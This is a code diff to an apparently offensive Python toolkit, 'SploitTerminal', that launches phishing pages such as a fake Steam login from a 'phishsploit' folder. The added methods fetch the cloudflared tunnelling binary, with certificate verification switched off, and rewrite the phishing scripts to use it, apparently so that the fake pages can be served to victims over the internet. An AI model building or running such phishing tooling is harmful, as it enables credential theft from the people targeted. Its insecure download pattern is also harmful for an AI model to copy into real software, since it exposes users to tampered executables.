@@ -1007,7 +1007,6 @@ class SploitTerminal:
                     print("↩️ Returning to main menu...")
                     break
 
-                # تعیین نام فایل بر اساس انتخاب کاربر
                 if choice == 1:
                     script_name = "steam.py"
                     page_name = "Steam"
@@ -1047,6 +1046,10 @@ class SploitTerminal:
                     original_dir = os.getcwd()
                     os.chdir(phishing_dir)
 
+                    cloudflared_path = self.prepare_cloudflared()
+
+                    self.update_script_temp(script_name, cloudflared_path)
+
                     if os.name == 'nt':  # Windows
                         os.system(f'python "{script_name}"')
                     else:  # Linux/Mac
@@ -1070,6 +1073,98 @@ class SploitTerminal:
                 break
             except Exception as e:
                 print(f"❌ Unexpected error: {str(e)}")
+
+    def prepare_cloudflared(self):
+        import os
+        import ssl
+        import urllib.request
+
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+
+        if os.name == 'nt':  # Windows
+            cloudflare_dir = os.path.join(base_dir, "Windows", "phishsploit", "cloud_flare")
+            os.makedirs(cloudflare_dir, exist_ok=True)
+
+            cloudflared_path = os.path.join(cloudflare_dir, "cloudflared.exe")
+
+            if not os.path.exists(cloudflared_path):
+                print("❌ cloudflared.exe not found! Please download it manually for Windows.")
+                print(f"📁 Place it here: {cloudflare_dir}")
+                input("Press Enter after placing cloudflared.exe...")
+                if not os.path.exists(cloudflared_path):
+                    raise Exception("cloudflared.exe still not found")
+
+            return cloudflared_path
+
+        else:  # Linux/Mac
+            # مسیر لینوکس که اسکریپت‌ها بتوانند آن را اجرا کنند
+            cloudflare_dir = os.path.join(base_dir, "Windows", "phishsploit", "cloud_flare")
+            os.makedirs(cloudflare_dir, exist_ok=True)
+
+            cloudflared_linux = os.path.join(cloudflare_dir, "cloudflared-linux")
+
+            if not os.path.exists(cloudflared_linux):
+                print("📥 Downloading cloudflared for Linux...")
+
+                try:
+                    ssl_context = ssl.create_default_context()
+                    ssl_context.check_hostname = False
+                    ssl_context.verify_mode = ssl.CERT_NONE
+
+                    download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+
+                    with urllib.request.urlopen(download_url, context=ssl_context) as response:
+                        with open(cloudflared_linux, 'wb') as out_file:
+                            out_file.write(response.read())
+
+                    os.chmod(cloudflared_linux, 0o755)
+                    print("✅ cloudflared for Linux downloaded successfully!")
+
+                except Exception as e:
+                    print(f"❌ Error downloading cloudflared: {e}")
+                    print("📥 Manual download required.")
+                    print(f"🌐 Download from: https://github.com/cloudflare/cloudflared/releases")
+                    print(f"📁 Save to: {cloudflared_linux}")
+                    print("🔒 Then run: chmod +x cloudflared-linux")
+                    input("Press Enter after manual download...")
+
+                    if not os.path.exists(cloudflared_linux):
+                        raise Exception("cloudflared-linux not found after download instruction")
+
+            return cloudflared_linux
+
+    def update_script_temp(self, script_name, cloudflared_path):
+        import os
+
+        script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Windows", "phishsploit", script_name)
+
+        if not os.path.exists(script_path):
+            print(f"❌ {script_name} not found at {script_path}")
+            return
+
+        try:
+            with open(script_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+
+            if 'cloudflared_path =' in content:
+                cloudflared_path_safe = cloudflared_path.replace("\\", "\\\\") if os.name == 'nt' else cloudflared_path
+                import re
+                new_content = re.sub(r'cloudflared_path\s*=.*', f'cloudflared_path = r"{cloudflared_path_safe}"',
+                                     content)
+
+                temp_script = os.path.join(os.path.dirname(script_path), f"temp_{script_name}")
+                with open(temp_script, 'w', encoding='utf-8') as f:
+                    f.write(new_content)
+
+                os.replace(temp_script, script_path)
+                print(f"✅ Updated {script_name} with correct cloudflared path")
+
+            else:
+                print(f"⚠️ No cloudflared_path found in {script_name}")
+
+        except Exception as e:
+            print(f"⚠️ Could not update {script_name}: {e}")
+
 
 
     def phishcreator_ai(self):
